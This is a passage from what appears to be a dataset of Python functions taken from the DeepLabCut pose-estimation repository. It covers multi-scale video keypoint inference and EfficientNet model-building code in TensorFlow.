        aug = iaa.Resize({'width': 'keep-aspect-ratio', 'height': scale})
        augs.append(aug)
    frames = []
    for i in range(len(scale_list)):
        resized_frame = augs[i](image=frame)
        frames.append(resized_frame)
        shapes.append(frames[-1].shape)
    return (frames, shapes)"
AlexEMG/DeepLabCut,_project_pred_to_original_size,"def _project_pred_to_original_size(pred, old_shape, new_shape):
    (old_h, old_w, _) = old_shape
    (new_h, new_w, _) = new_shape
    (ratio_h, ratio_w) = (old_h / new_h, old_w / new_w)
    coordinate = pred['coordinates'][0]
    confidence = pred['confidence']
    for (kpt_id, coord_list) in enumerate(coordinate):
        if len(coord_list) == 0:
            continue
        confidence_list = confidence[kpt_id]
        max_idx = np.argmax(confidence_list)
        max_pred = coordinate[kpt_id][max_idx] * ratio_h
        confidence[kpt_id] = confidence_list[max_idx]
        coordinate[kpt_id] = max_pred
    return pred"
AlexEMG/DeepLabCut,_average_multiple_scale_preds,"def _average_multiple_scale_preds(preds, scale_list, num_kpts, cos_dist_threshold=0.997, confidence_threshold=0.1):
    if len(scale_list) < 2:
        return preds[0]
    xyp = np.zeros((len(scale_list), num_kpts, 3))
    for (scale_id, pred) in enumerate(preds):
        if not isinstance(pred, dict):
            xyp[scale_id] = np.nan
            continue
        coordinates = pred['coordinates'][0]
        confidence = pred['confidence']
        for (i, (coords, conf)) in enumerate(zip(coordinates, confidence)):
            if not np.any(coords):
                continue
            xyp[scale_id, i, :2] = coords
            xyp[scale_id, i, 2] = conf
    xy = xyp[..., :2]
    mean_vec = np.nanmedian(xy, axis=0)
    dist_ = np.einsum('ijk,jk->ij', xy, mean_vec)
    n = np.linalg.norm(xy, axis=2) * np.linalg.norm(mean_vec, axis=1)
    dist = np.nan_to_num(dist_ / n)
    mask = np.logical_or(xyp[..., 2] < confidence_threshold, dist < cos_dist_threshold)
    xyp[mask] = np.nan
    coords = np.nanmedian(xyp[..., :2], axis=0)
    conf = np.nanmedian(xyp[..., 2], axis=0)
    dict_ = {'coordinates': [list(coords[:, None])], 'confidence': list(conf[:, None].astype(np.float32))}
    return dict_"
AlexEMG/DeepLabCut,_video_inference,"def _video_inference(test_cfg, sess, inputs, outputs, cap, nframes, batchsize, scale_list=[]):
    strwidth = int(np.ceil(np.log10(nframes)))
    batch_ind = 0
    (nx, ny) = cap.dimensions
    pbar = tqdm(total=nframes)
    counter = 0
    inds = []
    print('scale list', scale_list)
    PredicteData = {}
    multi_scale_batched_frames = None
    frame_shapes = None
    num_kpts = len(test_cfg['all_joints_names'])
    while cap.video.isOpened():
        _frame = cap.read_frame()
        if _frame is not None:
            frame = img_as_ubyte(_frame)
            old_shape = frame.shape
            (frames, frame_shapes) = get_multi_scale_frames(frame, scale_list)
            if multi_scale_batched_frames is None:
                multi_scale_batched_frames = [np.empty((batchsize, frame.shape[0], frame.shape[1], 3), dtype='ubyte') for frame in frames]
            for (scale_id, frame) in enumerate(frames):
                multi_scale_batched_frames[scale_id][batch_ind] = frame
            inds.append(counter)
            if batch_ind == batchsize - 1:
                preds = []
                for (scale_id, batched_frames) in enumerate(multi_scale_batched_frames):
                    D = predict.predict_batched_peaks_and_costs(test_cfg, batched_frames, sess, inputs, outputs)
                    preds.append(D)
                ind_start = inds[0]
                for i in range(batchsize):
                    ind = ind_start + i
                    PredicteData['frame' + str(ind).zfill(strwidth)] = []
                    for scale_id in range(len(scale_list)):
                        if i >= len(preds[scale_id]):
                            pred = []
                        else:
                            pred = preds[scale_id][i]
                        if pred != []:
                            pred = _project_pred_to_original_size(pred, old_shape, frame_shapes[scale_id])
                        PredicteData['frame' + str(ind).zfill(strwidth)].append(pred)
                batch_ind = 0
                inds.clear()
            else:
                batch_ind += 1
        elif counter >= nframes:
            if batch_ind > 0:
                preds = []
                for (scale_id, batched_frames) in enumerate(multi_scale_batched_frames):
                    D = predict.predict_batched_peaks_and_costs(test_cfg, batched_frames, sess, inputs, outputs)
                    preds.append(D)
                ind_start = inds[0]
                for i in range(batchsize):
                    ind = ind_start + i
                    if ind >= nframes:
                        break
                    PredicteData['frame' + str(ind).zfill(strwidth)] = []
                    for scale_id in range(len(scale_list)):
                        if i >= len(preds[scale_id]):
                            pred = []
                        else:
                            pred = preds[scale_id][i]
                        if pred != []:
                            pred = _project_pred_to_original_size(pred, old_shape, frame_shapes[scale_id])
                        PredicteData['frame' + str(ind).zfill(strwidth)].append(pred)
            break
        counter += 1
        pbar.update(1)
    cap.close()
    pbar.close()
    for (k, v) in PredicteData.items():
        if v != []:
            PredicteData[k] = _average_multiple_scale_preds(v, scale_list, num_kpts)
    PredicteData['metadata'] = {'nms radius': test_cfg.get('nmsradius', None), 'minimal confidence': test_cfg.get('minconfidence', None), 'sigma': test_cfg.get('sigma', 1), 'PAFgraph': test_cfg.get('partaffinityfield_graph', None), 'PAFinds': test_cfg.get('paf_best', np.arange(len(test_cfg['partaffinityfield_graph']))), 'all_joints': [[i] for i in range(len(test_cfg['all_joints']))], 'all_joints_names': [test_cfg['all_joints_names'][i] for i in range(len(test_cfg['all_joints']))], 'nframes': nframes}
    return (PredicteData, nframes)"
AlexEMG/DeepLabCut,video_inference,"def video_inference(videos, superanimal_name, scale_list=[], videotype='avi', destfolder=None, batchsize=1, robust_nframes=False, allow_growth=False, init_weights='', customized_test_config=''):
    if superanimal_name not in MODELOPTIONS:
        raise ValueError(f'{superanimal_name} not available. Available ones are: {MODELOPTIONS}. If you are confident `superanimal_name` is right, try updating `dlclibrary` with `pip install -U dlclibrary`.')
    dlc_root_path = auxiliaryfunctions.get_deeplabcut_path()
    if customized_test_config == '':
        supermodels = parse_available_supermodels()
        test_cfg = load_config(os.path.join(dlc_root_path, 'pose_estimation_tensorflow', 'superanimal_configs', supermodels[superanimal_name]))
    else:
        test_cfg = load_config(customized_test_config)
    weight_folder = str(Path(dlc_root_path) / 'pose_estimation_tensorflow' / 'models' / 'pretrained' / (superanimal_name + '_weights'))
    pat = os.path.join(weight_folder, 'snapshot-*.index')
    snapshots = glob.glob(pat)
    if not len(snapshots):
        download_huggingface_model(superanimal_name, weight_folder)
        snapshots = glob.glob(pat)
    else:
        print(f'{weight_folder} exists, using the downloaded weights')
    test_cfg['partaffinityfield_graph'] = []
    test_cfg['partaffinityfield_predict'] = False
    if init_weights != '':
        test_cfg['init_weights'] = init_weights
    else:
        init_weights = os.path.abspath(snapshots[0]).replace('.index', '')
        test_cfg['init_weights'] = init_weights
    test_cfg['num_outputs'] = 1
    test_cfg['batch_size'] = batchsize
    (sess, inputs, outputs) = single_predict.setup_pose_prediction(test_cfg, allow_growth=allow_growth)
    DLCscorer = 'DLC_' + Path(test_cfg['init_weights']).stem
    videos = auxiliaryfunctions.get_list_of_videos(videos, videotype)
    datafiles = []
    for video in videos:
        vname = Path(video).stem
        videofolder = str(Path(video).parents[0])
        if destfolder is None:
            destfolder = videofolder
            auxiliaryfunctions.attempt_to_make_folder(destfolder)
        dataname = os.path.join(destfolder, vname + DLCscorer + '.h5')
        datafiles.append(dataname)
        if os.path.isfile(dataname):
            print('Video already analyzed!', dataname)
        else:
            print('Loading ', video)
            vid = VideoWriter(video)
            if len(scale_list) == 0:
                scale_list = [vid.height - 50, vid.height, vid.height + 50]
            if robust_nframes:
                nframes = vid.get_n_frames(robust=True)
                duration = vid.calc_duration(robust=True)
                fps = nframes / duration
            else:
                nframes = len(vid)
                duration = vid.calc_duration(robust=False)
                fps = vid.fps
            (nx, ny) = vid.dimensions
            print('Duration of video [s]: ', round(duration, 2), ', recorded with ', round(fps, 2), 'fps!')
            print('Overall # of frames: ', nframes, ' found with (before cropping) frame dimensions: ', nx, ny)
            start = time.time()
            print('Starting to extract posture')
            (PredicteData, nframes) = _video_inference(test_cfg, sess, inputs, outputs, vid, nframes, int(test_cfg['batch_size']), scale_list=scale_list)
            stop = time.time()
            coords = [0, nx, 0, ny]
            dictionary = {'start': start, 'stop': stop, 'run_duration': stop - start, 'Scorer': DLCscorer, 'DLC-model-config file': test_cfg, 'fps': fps, 'batch_size': test_cfg['batch_size'], 'frame_dimensions': (ny, nx), 'nframes': nframes, 'iteration (active-learning)': 0, 'cropping': False, 'training set fraction': 70, 'cropping_parameters': coords}
            metadata = {'data': dictionary}
            print('Saving results in %s...' % destfolder)
            metadata_path = dataname.split('.h5')[0] + '_meta.pickle'
            with open(metadata_path, 'wb') as f:
                pickle.dump(metadata, f, pickle.HIGHEST_PROTOCOL)
            xyz_labs = ['x', 'y', 'likelihood']
            scorer = DLCscorer
            keypoint_names = test_cfg['all_joints_names']
            product = [[scorer], keypoint_names, xyz_labs]
            names = ['scorer', 'bodyparts', 'coords']
            columnindex = pd.MultiIndex.from_product(product, names=names)
            imagenames = [k for k in PredicteData.keys() if k != 'metadata']
            data = np.full((len(imagenames), len(columnindex)), np.nan)
            for (i, imagename) in enumerate(imagenames):
                dict_ = PredicteData[imagename]
                if dict_ == [] or dict_ == [[]]:
                    data[i, 2::3] = 0
                else:
                    keypoints = dict_['coordinates'][0]
                    confidence = dict_['confidence']
                    temp = np.full((len(keypoints), 3), np.nan)
                    for (n, (xy, c)) in enumerate(zip(keypoints, confidence)):
                        if xy.size and c.size:
                            temp[n, :2] = xy
                            temp[n, 2] = c
                    data[i] = temp.flatten()
            df = pd.DataFrame(data, columns=columnindex, index=imagenames)
            df.to_hdf(dataname, key='df_with_missing')
    return (init_weights, datafiles)"
AlexEMG/DeepLabCut,efficientnet_params,"def efficientnet_params(model_name):
    """"""Get efficientnet params based on model name.""""""
    params_dict = {'efficientnet-b0': (1.0, 1.0, 224, 0.2), 'efficientnet-b1': (1.0, 1.1, 240, 0.2), 'efficientnet-b2': (1.1, 1.2, 260, 0.3), 'efficientnet-b3': (1.2, 1.4, 300, 0.3), 'efficientnet-b4': (1.4, 1.8, 380, 0.4), 'efficientnet-b5': (1.6, 2.2, 456, 0.4), 'efficientnet-b6': (1.8, 2.6, 528, 0.5), 'efficientnet-b7': (2.0, 3.1, 600, 0.5)}
    return params_dict[model_name]"
AlexEMG/DeepLabCut,swish,"def swish(features, use_native=True):
    """"""Computes the Swish activation function.
    The tf.nn.swish operation uses a custom gradient to reduce memory usage.
    Since saving custom gradients in SavedModel is currently not supported, and
    one would not be able to use an exported TF-Hub module for fine-tuning, we
    provide this wrapper that can allow to select whether to use the native
    TensorFlow swish operation, or whether to use a customized operation that
    has uses default TensorFlow gradient computation.
    Args:
      features: A `Tensor` representing preactivation values.
      use_native: Whether to use the native swish from tf.nn that uses a custom
        gradient to reduce memory usage, or to use customized swish that uses
        default TensorFlow gradient computation.
    Returns:
      The activation value.
    """"""
    if use_native:
        return tf.nn.swish(features)
    else:
        features = tf.convert_to_tensor(value=features, name='features')
        return features * tf.nn.sigmoid(features)"
AlexEMG/DeepLabCut,efficientnet,"def efficientnet(width_coefficient=None, depth_coefficient=None, dropout_rate=0.2, drop_connect_rate=0.2):
    """"""Creates a efficientnet model.""""""
    blocks_args = ['r1_k3_s11_e1_i32_o16_se0.25', 'r2_k3_s22_e6_i16_o24_se0.25', 'r2_k5_s22_e6_i24_o40_se0.25', 'r3_k3_s22_e6_i40_o80_se0.25', 'r3_k5_s11_e6_i80_o112_se0.25', 'r4_k5_s11_e6_i112_o192_se0.25', 'r1_k3_s11_e6_i192_o320_se0.25']
    global_params = efficientnet_model.GlobalParams(batch_norm_momentum=0.99, batch_norm_epsilon=0.001, dropout_rate=dropout_rate, drop_connect_rate=drop_connect_rate, data_format='channels_last', num_classes=1000, width_coefficient=width_coefficient, depth_coefficient=depth_coefficient, depth_divisor=8, min_depth=None, relu_fn=tf.nn.swish, batch_norm=utils.BatchNormalization, use_se=True)
    decoder = BlockDecoder()
    return (decoder.decode(blocks_args), global_params)"
AlexEMG/DeepLabCut,get_model_params,"def get_model_params(model_name, override_params):
    """"""Get the block args and global params for a given model.""""""
    if model_name.startswith('efficientnet'):
        (width_coefficient, depth_coefficient, _, dropout_rate) = efficientnet_params(model_name)
        (blocks_args, global_params) = efficientnet(width_coefficient, depth_coefficient, dropout_rate)
    else:
        raise NotImplementedError('model name is not pre-defined: %s' % model_name)
    if override_params:
        global_params = global_params._replace(**override_params)
    tf.compat.v1.logging.info('global_params= %s', global_params)
    tf.compat.v1.logging.info('blocks_args= %s', blocks_args)
    return (blocks_args, global_params)"
AlexEMG/DeepLabCut,build_model,"def build_model(images, model_name, training, override_params=None, model_dir=None, fine_tuning=False, features_only=False):
    """"""A helper function to creates a model and returns predicted logits.
    Args:
      images: input images tensor.
      model_name: string, the predefined model name.
      training: boolean, whether the model is constructed for training.
      override_params: A dictionary of params for overriding. Fields must exist in
        efficientnet_model.GlobalParams.
      model_dir: string, optional model dir for saving configs.
      fine_tuning: boolean, whether the model is used for finetuning.
      features_only: build the base feature network only.
    Returns:
      logits: the logits tensor of classes.
      endpoints: the endpoints for each layer.
    Raises:
      When model_name specified an undefined model, raises NotImplementedError.
      When override_params has invalid fields, raises ValueError.
    """"""
    assert isinstance(images, tf.Tensor)
    if not training or fine_tuning:
        if not override_params:
            override_params = {}
        override_params['batch_norm'] = utils.BatchNormalization
        override_params['relu_fn'] = functools.partial(swish, use_native=False)
    (blocks_args, global_params) = get_model_params(model_name, override_params)
    if model_dir:
        param_file = os.path.join(model_dir, 'model_params.txt')
        if not tf.io.gfile.exists(param_file):
            if not tf.io.gfile.exists(model_dir):
                tf.io.gfile.makedirs(model_dir)
            with tf.io.gfile.GFile(param_file, 'w') as f:
                tf.compat.v1.logging.info('writing to %s' % param_file)
                f.write('model_name= %s\n\n' % model_name)
                f.write('global_params= %s\n\n' % str(global_params))
                f.write('blocks_args= %s\n\n' % str(blocks_args))
    with tf.compat.v1.variable_scope(model_name):
        model = efficientnet_model.Model(blocks_args, global_params)
        outputs = model(images, training=training, features_only=features_only)
    outputs = tf.identity(outputs, 'features' if features_only else 'logits')
    return (outputs, model.endpoints)"
AlexEMG/DeepLabCut,build_model_base,"def build_model_base(images, model_name, use_batch_norm=False, drop_out=False, override_params=None):
    """"""A helper function to create a base model and return global_pool.
    Args:
      images: input images tensor.
      model_name: string, the predefined model name.
      training: boolean, whether the model is constructed for training.
      override_params: A dictionary of params for overriding. Fields must exist in
        efficientnet_model.GlobalParams.
    Returns:
      features: global pool features.
      endpoints: the endpoints for each layer.
    Raises:
      When model_name specified an undefined model, raises NotImplementedError.
      When override_params has invalid fields, raises ValueError.
    """"""
    assert isinstance(images, tf.Tensor)
    (blocks_args, global_params) = get_model_params(model_name, override_params)
    with tf.compat.v1.variable_scope(model_name):
        model = efficientnet_model.Model(blocks_args, global_params)
        features = model(images, use_batch_norm=use_batch_norm, drop_out=drop_out, features_only=True)
    features = tf.identity(features, 'features')
    return (features, model.endpoints)"
AlexEMG/DeepLabCut,_decode_block_string,"def _decode_block_string(self, block_string):
    """"""Gets a block through a string notation of arguments.""""""
    assert isinstance(block_string, str)
    ops = block_string.split('_')
    options = {}
    for op in ops:
        splits = re.split('(\\d.*)', op)
        if len(splits) >= 2:
            (key, value) = splits[:2]
            options[key] = value
    if 's' not in options or len(options['s']) != 2:
        raise ValueError('Strides options should be a pair of integers.')
    return efficientnet_model.BlockArgs(kernel_size=int(options['k']), num_repeat=int(options['r']), input_filters=int(options['i']), output_filters=int(options['o']), expand_ratio=int(options['e']), id_skip='noskip' not in block_string, se_ratio=float(options['se']) if 'se' in options else None, strides=[int(options['s'][0]), int(options['s'][1])], conv_type=int(options['c']) if 'c' in options else 0)"
AlexEMG/DeepLabCut,_encode_block_string,"def _encode_block_string(self, block):
    """"""Encodes a block to a string.""""""
    args = ['r%d' % block.num_repeat, 'k%d' % block.kernel_size, 's%d%d' % (block.strides[0], block.strides[1]), 'e%s' % block.expand_ratio, 'i%d' % block.input_filters, 'o%d' % block.output_filters, 'c%d' % block.conv_type]
    if block.se_ratio > 0 and block.se_ratio <= 1:
        args.append('se%s' % block.se_ratio)
    if block.id_skip is False:
        args.append('noskip')
    return '_'.join(args)"
AlexEMG/DeepLabCut,decode,"def decode(self, string_list):
    """"""Decodes a list of string notations to specify blocks inside the network.
        Args:
          string_list: a list of strings, each string is a notation of block.
        Returns:
          A list of namedtuples to represent blocks arguments.
        """"""
    assert isinstance(string_list, list)
    blocks_args = []
    for block_string in string_list:
        blocks_args.append(self._decode_block_string(block_string))
    return blocks_args"
AlexEMG/DeepLabCut,encode,"def encode(self, blocks_args):
    """"""Encodes a list of Blocks to a list of strings.
        Args:
          blocks_args: A list of namedtuples to represent blocks arguments.
        Returns:
          a list of strings, each string is a notation of block.
        """"""
    block_strings = []
    for block in blocks_args:
        block_strings.append(self._encode_block_string(block))
    return block_strings"
AlexEMG/DeepLabCut,conv_kernel_initializer,"def conv_kernel_initializer(shape, dtype=None, partition_info=None):
    """"""Initialization for convolutional kernels.
    The main difference with tf.variance_scaling_initializer is that
    tf.variance_scaling_initializer uses a truncated normal with an uncorrected
    standard deviation, whereas here we use a normal distribution. Similarly,
    tf.contrib.layers.variance_scaling_initializer uses a truncated normal with
    a corrected standard deviation.
    Args:
      shape: shape of variable
      dtype: dtype of variable
      partition_info: unused
    Returns:
      an initialization for the variable
    """"""
    del partition_info
    (kernel_height, kernel_width, _, out_filters) = shape
    fan_out = int(kernel_height * kernel_width * out_filters)
    return tf.random.normal(shape, mean=0.0, stddev=np.sqrt(2.0 / fan_out), dtype=dtype)"
AlexEMG/DeepLabCut,dense_kernel_initializer,"def dense_kernel_initializer(shape, dtype=None, partition_info=None):
    """"""Initialization for dense kernels.
    This initialization is equal to
      tf.variance_scaling_initializer(scale=1.0/3.0, mode='fan_out',
                                      distribution='uniform').
    It is written out explicitly here for clarity.
    Args:
      shape: shape of variable
      dtype: dtype of variable
      partition_info: unused
    Returns:
      an initialization for the variable
    """"""
    del partition_info
    init_range = 1.0 / np.sqrt(shape[1])
    return tf.random.uniform(shape, -init_range, init_range, dtype=dtype)"
AlexEMG/DeepLabCut,round_filters,"def round_filters(filters, global_params):
    """"""Round number of filters based on depth multiplier.""""""
    orig_f = filters
    multiplier = global_params.width_coefficient
    divisor = global_params.depth_divisor
    min_depth = global_params.min_depth
    if not multiplier:
        return filters
    filters *= multiplier
    min_depth = min_depth or divisor
    new_filters = max(min_depth, int(filters + divisor / 2) // divisor * divisor)
    if new_filters < 0.9 * filters:
        new_filters += divisor
    tf.compat.v1.logging.info('round_filter input={} output={}'.format(orig_f, new_filters))
    return int(new_filters)"
AlexEMG/DeepLabCut,round_repeats,"def round_repeats(repeats, global_params):
    """"""Round number of filters based on depth multiplier.""""""
    multiplier = global_params.depth_coefficient
    if not multiplier:
        return repeats
    return int(math.ceil(multiplier * repeats))"
AlexEMG/DeepLabCut,__init__,"def __init__(self, block_args, global_params):
    """"""Initializes a MBConv block.
        Args:
          block_args: BlockArgs, arguments to create a Block.
          global_params: GlobalParams, a set of global parameters.
        """"""
    super(MBConvBlock, self).__init__()
    self._block_args = block_args
    self._batch_norm_momentum = global_params.batch_norm_momentum
    self._batch_norm_epsilon = global_params.batch_norm_epsilon
    self._batch_norm = global_params.batch_norm
    self._data_format = global_params.data_format
    if self._data_format == 'channels_first':
        self._channel_axis = 1
        self._spatial_dims = [2, 3]
    else:
        self._channel_axis = -1
        self._spatial_dims = [1, 2]
    self._relu_fn = global_params.relu_fn or tf.nn.swish
    self._has_se = global_params.use_se and self._block_args.se_ratio is not None and (0 < self._block_args.se_ratio <= 1)
    self.endpoints = None
    self._build()"
AlexEMG/DeepLabCut,block_args,"def block_args(self):
    return self._block_args"
AlexEMG/DeepLabCut,_build,"def _build(self):
    """"""Builds block according to the arguments.""""""
    filters = self._block_args.input_filters * self._block_args.expand_ratio
    if self._block_args.expand_ratio != 1:
        self._expand_conv = tf.compat.v1.layers.Conv2D(filters, kernel_size=[1, 1], strides=[1, 1], kernel_initializer=conv_kernel_initializer, padding='same', data_format=self._data_format, use_bias=False)
        self._bn0 = self._batch_norm(axis=self._channel_axis, momentum=self._batch_norm_momentum, epsilon=self._batch_norm_epsilon)
    kernel_size = self._block_args.kernel_size
    self._depthwise_conv = utils.DepthwiseConv2D([kernel_size, kernel_size], strides=self._block_args.strides, depthwise_initializer=conv_kernel_initializer, padding='same', data_format=self._data_format, use_bias=False)
    self._bn1 = self._batch_norm(axis=self._channel_axis, momentum=self._batch_norm_momentum, epsilon=self._batch_norm_epsilon)
    if self._has_se:
        num_reduced_filters = max(1, int(self._block_args.input_filters * self._block_args.se_ratio))
        self._se_reduce = tf.compat.v1.layers.Conv2D(num_reduced_filters, kernel_size=[1, 1], strides=[1, 1], kernel_initializer=conv_kernel_initializer, padding='same', data_format=self._data_format, use_bias=True)
        self._se_expand = tf.compat.v1.layers.Conv2D(filters, kernel_size=[1, 1], strides=[1, 1], kernel_initializer=conv_kernel_initializer, padding='same', data_format=self._data_format, use_bias=True)
    filters = self._block_args.output_filters
    self._project_conv = tf.compat.v1.layers.Conv2D(filters, kernel_size=[1, 1], strides=[1, 1], kernel_initializer=conv_kernel_initializer, padding='same', data_format=self._data_format, use_bias=False)
    self._bn2 = self._batch_norm(axis=self._channel_axis, momentum=self._batch_norm_momentum, epsilon=self._batch_norm_epsilon)"
AlexEMG/DeepLabCut,_call_se,"def _call_se(self, input_tensor):
    """"""Call Squeeze and Excitation layer.
        Args:
          input_tensor: Tensor, a single input tensor for Squeeze/Excitation layer.
        Returns:
          A output tensor, which should have the same shape as input.
        """"""
    se_tensor = tf.reduce_mean(input_tensor=input_tensor, axis=self._spatial_dims, keepdims=True)
    se_tensor = self._se_expand(self._relu_fn(self._se_reduce(se_tensor)))
    tf.compat.v1.logging.info('Built Squeeze and Excitation with tensor shape: %s' % se_tensor.shape)
    return tf.sigmoid(se_tensor) * input_tensor"
AlexEMG/DeepLabCut,call,"def call(self, inputs, use_batch_norm=False, drop_out=False, drop_connect_rate=None):
    """"""Implementation of call().
        Args:
          inputs: the inputs tensor.
          training: boolean, whether the model is constructed for training.
          drop_connect_rate: float, between 0 to 1, drop connect rate.
        Returns:
          A output tensor.
        """"""
    tf.compat.v1.logging.info('Block input: %s shape: %s' % (inputs.name, inputs.shape))
    if self._block_args.expand_ratio != 1:
        x = self._relu_fn(self._bn0(self._expand_conv(inputs), training=use_batch_norm))
    else:
        x = inputs
    tf.compat.v1.logging.info('Expand: %s shape: %s' % (x.name, x.shape))
    x = self._relu_fn(self._bn1(self._depthwise_conv(x), training=use_batch_norm))
    tf.compat.v1.logging.info('DWConv: %s shape: %s' % (x.name, x.shape))
    if self._has_se:
        with tf.compat.v1.variable_scope('se'):
            x = self._call_se(x)
    self.endpoints = {'expansion_output': x}
    x = self._bn2(self._project_conv(x), training=use_batch_norm)
    if self._block_args.id_skip:
        if all((s == 1 for s in self._block_args.strides)) and self._block_args.input_filters == self._block_args.output_filters:
            if drop_connect_rate:
                x = utils.drop_connect(x, drop_out, drop_connect_rate)
            x = tf.add(x, inputs)
    tf.compat.v1.logging.info('Project: %s shape: %s' % (x.name, x.shape))
    return x"
AlexEMG/DeepLabCut,_build,"def _build(self):
    """"""Builds block according to the arguments.""""""
    filters = self._block_args.input_filters * self._block_args.expand_ratio
    if self._block_args.expand_ratio != 1:
        self._expand_conv = tf.compat.v1.layers.Conv2D(filters, kernel_size=[3, 3], strides=[1, 1], kernel_initializer=conv_kernel_initializer, padding='same', use_bias=False)
        self._bn0 = self._batch_norm(axis=self._channel_axis, momentum=self._batch_norm_momentum, epsilon=self._batch_norm_epsilon)
    filters = self._block_args.output_filters
    self._project_conv = tf.compat.v1.layers.Conv2D(filters, kernel_size=[1, 1], strides=self._block_args.strides, kernel_initializer=conv_kernel_initializer, padding='same', use_bias=False)
    self._bn1 = self._batch_norm(axis=self._channel_axis, momentum=self._batch_norm_momentum, epsilon=self._batch_norm_epsilon)"
AlexEMG/DeepLabCut,call,"def call(self, inputs, use_batch_norm=False, drop_out=False, drop_connect_rate=None):
    """"""Implementation of call().
        Args:
          inputs: the inputs tensor.
          training: boolean, whether the model is constructed for training.
          drop_connect_rate: float, between 0 to 1, drop connect rate.
        Returns:
          A output tensor.
        """"""
    tf.compat.v1.logging.info('Block input: %s shape: %s' % (inputs.name, inputs.shape))
    if self._block_args.expand_ratio != 1:
        x = self._relu_fn(self._bn0(self._expand_conv(inputs), training=use_batch_norm))
    else:
        x = inputs
    tf.compat.v1.logging.info('Expand: %s shape: %s' % (x.name, x.shape))
    self.endpoints = {'expansion_output': x}
    x = self._bn1(self._project_conv(x), training=use_batch_norm)
    if self._block_args.id_skip:
        if all((s == 1 for s in self._block_args.strides)) and self._block_args.input_filters == self._block_args.output_filters:
            if drop_connect_rate:
                x = utils.drop_connect(x, drop_out, drop_connect_rate)
            x = tf.add(x, inputs)
    tf.compat.v1.logging.info('Project: %s shape: %s' % (x.name, x.shape))
    return x"
AlexEMG/DeepLabCut,__init__,"def __init__(self, blocks_args=None, global_params=None):
    """"""Initializes an `Model` instance.
        Args:
          blocks_args: A list of BlockArgs to construct block modules.
          global_params: GlobalParams, a set of global parameters.
        Raises:
          ValueError: when blocks_args is not specified as a list.
        """"""
    super(Model, self).__init__()
    if not isinstance(blocks_args, list):
        raise ValueError('blocks_args should be a list.')
    self._global_params = global_params
    self._blocks_args = blocks_args
    self._relu_fn = global_params.relu_fn or tf.nn.swish
    self._batch_norm = global_params.batch_norm
    self.endpoints = None
    self._build()"
AlexEMG/DeepLabCut,_get_conv_block,"def _get_conv_block(self, conv_type):
    conv_block_map = {0: MBConvBlock, 1: MBConvBlockWithoutDepthwise}
    return conv_block_map[conv_type]"
AlexEMG/DeepLabCut,_build,"def _build(self):
    """"""Builds a model.""""""
    self._blocks = []
    for block_args in self._blocks_args:
        assert block_args.num_repeat > 0
        block_args = block_args._replace(input_filters=round_filters(block_args.input_filters, self._global_params), output_filters=round_filters(block_args.output_filters, self._global_params), num_repeat=round_repeats(block_args.num_repeat, self._global_params))
        conv_block = self._get_conv_block(block_args.conv_type)
        self._blocks.append(conv_block(block_args, self._global_params))
        if block_args.num_repeat > 1:
            block_args = block_args._replace(input_filters=block_args.output_filters, strides=[1, 1])
        for _ in range(block_args.num_repeat - 1):
            self._blocks.append(conv_block(block_args, self._global_params))
    batch_norm_momentum = self._global_params.batch_norm_momentum
    batch_norm_epsilon = self._global_params.batch_norm_epsilon
    if self._global_params.data_format == 'channels_first':
        channel_axis = 1
    else:
        channel_axis = -1
    self._conv_stem = tf.compat.v1.layers.Conv2D(filters=round_filters(32, self._global_params), kernel_size=[3, 3], strides=[2, 2], kernel_initializer=conv_kernel_initializer, padding='same', data_format=self._global_params.data_format, use_bias=False)
    self._bn0 = self._batch_norm(axis=channel_axis, momentum=batch_norm_momentum, epsilon=batch_norm_epsilon)
    self._conv_head = tf.compat.v1.layers.Conv2D(filters=round_filters(1280, self._global_params), kernel_size=[1, 1], strides=[1, 1], kernel_initializer=conv_kernel_initializer, padding='same', use_bias=False)
    self._bn1 = self._batch_norm(axis=channel_axis, momentum=batch_norm_momentum, epsilon=batch_norm_epsilon)
    self._avg_pooling = tf.keras.layers.GlobalAveragePooling2D(data_format=self._global_params.data_format)
    if self._global_params.num_classes:
        self._fc = tf.compat.v1.layers.Dense(self._global_params.num_classes, kernel_initializer=dense_kernel_initializer)
    else:
        self._fc = None
    if self._global_params.dropout_rate > 0:
        self._dropout = tf.keras.layers.Dropout(self._global_params.dropout_rate)
    else:
        self._dropout = None"
AlexEMG/DeepLabCut,call,"def call(self, inputs, use_batch_norm=False, drop_out=False, features_only=None):
    """"""Implementation of call().
        Args:
          inputs: input tensors.
          training: boolean, whether the model is constructed for training.
          features_only: build the base feature network only.
        Returns:
          output tensors.
        """"""
    outputs = None
    self.endpoints = {}
    with tf.compat.v1.variable_scope('stem'):
        outputs = self._relu_fn(self._bn0(self._conv_stem(inputs), training=use_batch_norm))
    tf.compat.v1.logging.info('Built stem layers with output shape: %s' % outputs.shape)
    self.endpoints['stem'] = outputs
    reduction_idx = 0
    for (idx, block) in enumerate(self._blocks):
        is_reduction = False
        if idx == len(self._blocks) - 1 or self._blocks[idx + 1].block_args().strides[0] > 1:
            is_reduction = True
            reduction_idx += 1
        with tf.compat.v1.variable_scope('blocks_%s' % idx):
            drop_rate = self._global_params.drop_connect_rate
            if drop_rate:
                drop_rate *= float(idx) / len(self._blocks)
                tf.compat.v1.logging.info('block_%s drop_connect_rate: %s' % (idx, drop_rate))
            outputs = block.call(outputs, use_batch_norm=use_batch_norm, drop_out=drop_out, drop_connect_rate=drop_rate)
            self.endpoints['block_%s' % idx] = outputs
            if is_reduction:
                self.endpoints['reduction_%s' % reduction_idx] = outputs
            if block.endpoints:
                for (k, v) in block.endpoints.items():
                    self.endpoints['block_%s/%s' % (idx, k)] = v
                    if is_reduction:
                        self.endpoints['reduction_%s/%s' % (reduction_idx, k)] = v
    self.endpoints['features'] = outputs
    if not features_only:
        with tf.compat.v1.variable_scope('head'):
            outputs = self._relu_fn(self._bn1(self._conv_head(outputs), training=use_batch_norm))
            outputs = self._avg_pooling(outputs)
            if self._dropout:
                outputs = self._dropout(outputs, training=drop_out)
            self.endpoints['global_pool'] = outputs
            if self._fc:
                outputs = self._fc(outputs)
            self.endpoints['head'] = outputs
    return outputs"
AlexEMG/DeepLabCut,apply_activation,"@slim.add_arg_scope
def apply_activation(x, name=None, activation_fn=None):
    return activation_fn(x, name=name) if activation_fn else x"
AlexEMG/DeepLabCut,_set_arg_scope_defaults,"@contextlib.contextmanager
def _set_arg_scope_defaults(defaults):
    """"""Sets arg scope defaults for all items present in defaults.

    Args:
      defaults: dictionary/list of pairs, containing a mapping from
      function to a dictionary of default args.

    Yields:
      context manager where all defaults are set.
    """"""
    if hasattr(defaults, 'items'):
        items = list(defaults.items())
    else:
        items = defaults
    if not items:
        yield
    else:
        (func, default_arg) = items[0]
